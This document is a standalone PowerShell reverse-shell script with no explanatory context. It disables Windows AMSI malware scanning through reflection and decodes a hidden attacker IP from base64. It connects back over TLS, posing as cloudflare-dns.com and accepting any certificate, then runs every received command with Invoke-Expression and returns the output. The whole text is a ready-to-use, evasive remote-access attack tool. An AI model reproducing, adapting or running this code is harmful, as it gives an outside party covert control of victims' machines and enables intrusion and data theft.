$m = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
if ($m) {
    $f = $m.GetField('amsiInitFailed', 'NonPublic,Static')
    if ($f) { $f.SetValue($null, $true) }
}

try {
    
    $p = [System.Security.Authentication.SslProtocols]::Tls12
    $i = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MTQ2LjcwLjI0MC4yMDU='));
    $port = 54983

    
    $c = New-Object Net.Sockets.TCPClient($i, $port)
    $st = $c.GetStream()
    $s = New-Object Net.Security.SslStream($st, $false, ({$true} -as [Net.Security.RemoteCertificateValidationCallback]))
    $s.AuthenticateAsClient("cloudflare-dns.com", $null, $p, $false)

    $w = New-Object IO.StreamWriter($s); $w.AutoFlush = $true

    function _out($txt) {
        [byte[]]$script:b = New-Object System.Byte[] 4096
        $w.Write($txt + "PS " + (Get-Location).Path + "> ")
    }

    _out ''

    while(($r = $s.Read($b, 0, $b.Length)) -gt 0) {
        $cmd = ([text.encoding]::UTF8).GetString($b, 0, $r).Trim()
        if ($cmd -eq 'exit') { break }
        $res = try { Invoke-Expression $cmd 2>&1 | Out-String } catch { $_ | Out-String }
        _out $res
    }
    $w.Close(); $c.Close()
} catch { exit }
